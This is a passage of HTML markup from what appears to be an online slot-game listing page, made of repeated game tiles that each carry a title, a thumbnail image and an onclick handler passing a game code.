                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/de17718036b670056167d0edd6b54416.webp?v=0.1" src="/assets/games/i/165x220/de17718036b670056167d0edd6b54416.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Good Luck &amp; Good Fortune">Good Luck &amp; Good Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rujak Bonanza™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rujak Bonanza™', '/assets/games/i/165x220/cea09fbc68fd92bc64d258ad776191bf.webp?v=0.1' , 'vs20rujakbnz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/cea09fbc68fd92bc64d258ad776191bf.webp?v=0.1" src="/assets/games/i/165x220/cea09fbc68fd92bc64d258ad776191bf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rujak Bonanza™">Rujak Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Wins™" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Wins™', '/assets/games/i/165x220/9e1e3b057df8d1ff272e7bd5b61d6992.webp?v=0.1' , 'vs1024mahjwins', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/9e1e3b057df8d1ff272e7bd5b61d6992.webp?v=0.1" src="/assets/games/i/165x220/9e1e3b057df8d1ff272e7bd5b61d6992.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Wins™">Mahjong Wins™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Year of the Dragon King" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Year of the Dragon King', '/assets/games/i/165x220/74eba8a3157b24526dc63cbd99d30e0e.webp?v=0.1' , 'vs20yotdk', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/74eba8a3157b24526dc63cbd99d30e0e.webp?v=0.1" src="/assets/games/i/165x220/74eba8a3157b24526dc63cbd99d30e0e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Year of the Dragon King">Year of the Dragon King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Juicy Fruits Multihold™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Juicy Fruits Multihold™', '/assets/games/i/165x220/0417b9ebdcb995940a0d088832fd4667.webp?v=0.2' , 'vs50jfmulthold', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0417b9ebdcb995940a0d088832fd4667.webp?v=0.2" src="/assets/games/i/165x220/0417b9ebdcb995940a0d088832fd4667.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Juicy Fruits Multihold™">Juicy Fruits Multihold™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Floating Dragon New Year Festival Ultra Megaways™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Floating Dragon New Year Festival Ultra Megaways™', '/assets/games/i/165x220/c61cbe4670e1031caa7dd4155a0feee9.webp?v=0.1' , 'vswaysfltdrgny', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c61cbe4670e1031caa7dd4155a0feee9.webp?v=0.1" src="/assets/games/i/165x220/c61cbe4670e1031caa7dd4155a0feee9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Floating Dragon New Year Festival Ultra Megaways™">Floating Dragon New Year Festival Ultra Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Castle of Fire" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Castle of Fire', '/assets/games/i/165x220/44fff92bc027f1806056a34f31e91912.webp?v=0.1' , 'vswaysexpandng', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/44fff92bc027f1806056a34f31e91912.webp?v=0.1" src="/assets/games/i/165x220/44fff92bc027f1806056a34f31e91912.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Castle of Fire">Castle of Fire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Wild Gang™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Wild Gang™', '/assets/games/i/165x220/55af41bd73e86d84c2dc0accaabc99bf.webp?v=0.1' , 'vswayswildgang', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/55af41bd73e86d84c2dc0accaabc99bf.webp?v=0.1" src="/assets/games/i/165x220/55af41bd73e86d84c2dc0accaabc99bf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Wild Gang™">The Wild Gang™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sea Fantasy™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sea Fantasy™', '/assets/games/i/165x220/8a275c8caabfb7a507c1742834ca93c6.webp?v=0.1' , 'vswaysseastory', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8a275c8caabfb7a507c1742834ca93c6.webp?v=0.1" src="/assets/games/i/165x220/8a275c8caabfb7a507c1742834ca93c6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sea Fantasy™">Sea Fantasy™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Stampede™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Stampede™', '/assets/games/i/165x220/64859b59e4af54a422b8100a52b5e42b.webp?v=0.1' , 'vswaysstampede', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/64859b59e4af54a422b8100a52b5e42b.webp?v=0.1" src="/assets/games/i/165x220/64859b59e4af54a422b8100a52b5e42b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Stampede™">Fire Stampede™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Jar Clusters™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Jar Clusters™', '/assets/games/i/165x220/6fcef955ee4ed7eba44fd89dcf03dadb.webp?v=0.1' , 'vs20cjcluster', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/6fcef955ee4ed7eba44fd89dcf03dadb.webp?v=0.1" src="/assets/games/i/165x220/6fcef955ee4ed7eba44fd89dcf03dadb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Jar Clusters™">Candy Jar Clusters™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ding Dong Christmas Bells™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ding Dong Christmas Bells™', '/assets/games/i/165x220/8beff5a53939e3320caca184c7c59801.webp?v=0.1' , 'vs10ddcbells', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/8beff5a53939e3320caca184c7c59801.webp?v=0.1" src="/assets/games/i/165x220/8beff5a53939e3320caca184c7c59801.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ding Dong Christmas Bells™">Ding Dong Christmas Bells™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Frozen Charms Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Frozen Charms Megaways™', '/assets/games/i/165x220/d06a5b993cda110e3f329ff62b888ea8.webp?v=0.1' , 'vswayscharms', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/d06a5b993cda110e3f329ff62b888ea8.webp?v=0.1" src="/assets/games/i/165x220/d06a5b993cda110e3f329ff62b888ea8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Frozen Charms Megaways™">5 Frozen Charms Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House Dice Show™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House Dice Show™', '/assets/games/i/165x220/78a6992e33e666437dece0cfee365fad.webp?v=0.1' , 'vs20dhdice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/78a6992e33e666437dece0cfee365fad.webp?v=0.1" src="/assets/games/i/165x220/78a6992e33e666437dece0cfee365fad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House Dice Show™">The Dog House Dice Show™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Rush Xmas™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Rush Xmas™', '/assets/games/i/165x220/0cdbe8beff71f1817ac2289f0f6a74d8.webp?v=0.1' , 'vs20sugrux', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0cdbe8beff71f1817ac2289f0f6a74d8.webp?v=0.1" src="/assets/games/i/165x220/0cdbe8beff71f1817ac2289f0f6a74d8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Rush Xmas™">Sugar Rush Xmas™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Grace of Ebisu™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Grace of Ebisu™', '/assets/games/i/165x220/f3d7d01a9f7505351a81ff7c965bf6c5.webp?v=0.1' , 'vs20olympgrace', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f3d7d01a9f7505351a81ff7c965bf6c5.webp?v=0.1" src="/assets/games/i/165x220/f3d7d01a9f7505351a81ff7c965bf6c5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Grace of Ebisu™">Grace of Ebisu™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Christmas Bash™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Christmas Bash™', '/assets/games/i/165x220/ec78fabb4f15f07fefb5571d1caee626.webp?v=0.1' , 'vs10bbsplxmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ec78fabb4f15f07fefb5571d1caee626.webp?v=0.1" src="/assets/games/i/165x220/ec78fabb4f15f07fefb5571d1caee626.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Christmas Bash™">Big Bass Christmas Bash™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker Jewels Dice™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker Jewels Dice™', '/assets/games/i/165x220/6c29cd3ee17a349da462865406050095.webp?v=0.1' , 'vs5jokerdice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6c29cd3ee17a349da462865406050095.webp?v=0.1" src="/assets/games/i/165x220/6c29cd3ee17a349da462865406050095.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker Jewels Dice™">Joker Jewels Dice™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Timber Stacks™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Timber Stacks™', '/assets/games/i/165x220/e0b716fbf1e0ebb739ca4b2bef857d25.webp?v=0.1' , 'vswaystimber', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e0b716fbf1e0ebb739ca4b2bef857d25.webp?v=0.1" src="/assets/games/i/165x220/e0b716fbf1e0ebb739ca4b2bef857d25.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Timber Stacks™">Timber Stacks™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Chase for Glory™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Chase for Glory™', '/assets/games/i/165x220/6e432ac5c954e45cabbd771c9ccf39e6.webp?v=0.1' , 'vswayscfglory', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/6e432ac5c954e45cabbd771c9ccf39e6.webp?v=0.1" src="/assets/games/i/165x220/6e432ac5c954e45cabbd771c9ccf39e6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Chase for Glory™">Chase for Glory™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Nile Fortunes™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Nile Fortunes™', '/assets/games/i/165x220/b5d4b5ced4eb1dc1930e350478c2238a.webp?v=0.1' , 'vs20nilefort', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b5d4b5ced4eb1dc1930e350478c2238a.webp?v=0.1" src="/assets/games/i/165x220/b5d4b5ced4eb1dc1930e350478c2238a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Nile Fortunes™">Nile Fortunes™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Twilight Princess" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Twilight Princess', '/assets/games/i/165x220/a635cc87106d004fb3a62264b7bd7d06.webp?v=0.1' , 'vs20dhcluster', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/a635cc87106d004fb3a62264b7bd7d06.webp?v=0.1" src="/assets/games/i/165x220/a635cc87106d004fb3a62264b7bd7d06.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Twilight Princess">Twilight Princess</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Halloween™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Halloween™', '/assets/games/i/165x220/d21083789f264a094e2e1e5020f6ea65.webp?v=0.1' , 'vs10bhallbnza', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/d21083789f264a094e2e1e5020f6ea65.webp?v=0.1" src="/assets/games/i/165x220/d21083789f264a094e2e1e5020f6ea65.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Halloween™">Big Bass Halloween™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Demon Pots™" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Demon Pots™', '/assets/games/i/165x220/736f8b3e4d8addb8279ff051d0b8c6d9.webp?v=0.1' , 'vs40demonpots', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/736f8b3e4d8addb8279ff051d0b8c6d9.webp?v=0.1" src="/assets/games/i/165x220/736f8b3e4d8addb8279ff051d0b8c6d9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Demon Pots™">Demon Pots™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza Dice™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza Dice™', '/assets/games/i/165x220/ca9fdfe88d7e05211132a670f6c283bb.webp?v=0.1' , 'vs20bnnzdice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ca9fdfe88d7e05211132a670f6c283bb.webp?v=0.1" src="/assets/games/i/165x220/ca9fdfe88d7e05211132a670f6c283bb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza Dice™">Sweet Bonanza Dice™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="888 Bonanza™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '888 Bonanza™', '/assets/games/i/165x220/0ca6bfca35eb328113eb442909737416.webp?v=0.1' , 'vs243goldfor', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0ca6bfca35eb328113eb442909737416.webp?v=0.1" src="/assets/games/i/165x220/0ca6bfca35eb328113eb442909737416.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="888 Bonanza™">888 Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rainbow Reels™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rainbow Reels™', '/assets/games/i/165x220/035638876928c5f3a2d29d4eb5d0c2f1.webp?v=0.1' , 'vs40rainbowr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/035638876928c5f3a2d29d4eb5d0c2f1.webp?v=0.1" src="/assets/games/i/165x220/035638876928c5f3a2d29d4eb5d0c2f1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rainbow Reels™">Rainbow Reels™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Money Men Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Money Men Megaways™', '/assets/games/i/165x220/976ec74f4c1f002e5940cf2f9c95112c.webp?v=0.1' , 'vswaysmoneyman', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/976ec74f4c1f002e5940cf2f9c95112c.webp?v=0.1" src="/assets/games/i/165x220/976ec74f4c1f002e5940cf2f9c95112c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Money Men Megaways™">The Money Men Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Supreme Powernudge" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Supreme Powernudge', '/assets/games/i/165x220/8d7fb092d709b4d9b124dc7db500aa64.webp?v=0.1' , 'vs20sugarnudge', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8d7fb092d709b4d9b124dc7db500aa64.webp?v=0.1" src="/assets/games/i/165x220/8d7fb092d709b4d9b124dc7db500aa64.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Supreme Powernudge">Sugar Supreme Powernudge</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tundra’s Fortune™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tundra’s Fortune™', '/assets/games/i/165x220/4d15e195f58ed8cb7913595f7543f596.webp?v=0.1' , 'vswaysraghex', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4d15e195f58ed8cb7913595f7543f596.webp?v=0.1" src="/assets/games/i/165x220/4d15e195f58ed8cb7913595f7543f596.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tundra’s Fortune™">Tundra’s Fortune™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Chips™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Chips™', '/assets/games/i/165x220/a0baf2ee5e92d262f8c2744b40efcc7b.webp?v=0.1' , 'vs20maskgame', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a0baf2ee5e92d262f8c2744b40efcc7b.webp?v=0.1" src="/assets/games/i/165x220/a0baf2ee5e92d262f8c2744b40efcc7b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Chips™">Cash Chips™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortunes of Aztec™" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortunes of Aztec™', '/assets/games/i/165x220/4c2107ced29659cf75bc7111969936a5.webp?v=0.1' , 'vswaysstrlght', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c2107ced29659cf75bc7111969936a5.webp?v=0.1" src="/assets/games/i/165x220/4c2107ced29659cf75bc7111969936a5.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortunes of Aztec™">Fortunes of Aztec™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Blitz™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Blitz™', '/assets/games/i/165x220/77f51be962f5722f5cfc9daf960d1e93.webp?v=0.1' , 'vs20candyblitz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/77f51be962f5722f5cfc9daf960d1e93.webp?v=0.1" src="/assets/games/i/165x220/77f51be962f5722f5cfc9daf960d1e93.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Blitz™">Candy Blitz™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gravity Bonanza™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gravity Bonanza™', '/assets/games/i/165x220/c1b9032f9d9822adcbb69c3d3d4eb7a9.webp?v=0.1' , 'vs20gravity', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c1b9032f9d9822adcbb69c3d3d4eb7a9.webp?v=0.1" src="/assets/games/i/165x220/c1b9032f9d9822adcbb69c3d3d4eb7a9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gravity Bonanza™">Gravity Bonanza™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Infective Wild™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Infective Wild™', '/assets/games/i/165x220/1cef32c62518f9b4540331fd9bf56a3f.webp?v=0.1' , 'vs40infwild', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1cef32c62518f9b4540331fd9bf56a3f.webp?v=0.1" src="/assets/games/i/165x220/1cef32c62518f9b4540331fd9bf56a3f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Infective Wild™">Infective Wild™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Oasis™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Oasis™', '/assets/games/i/165x220/034cd6948519b778b829f95022a00de8.webp?v=0.1' , 'vswaysincwnd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/034cd6948519b778b829f95022a00de8.webp?v=0.1" src="/assets/games/i/165x220/034cd6948519b778b829f95022a00de8.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Oasis™">Gold Oasis™</h5>
        </a>
        
     
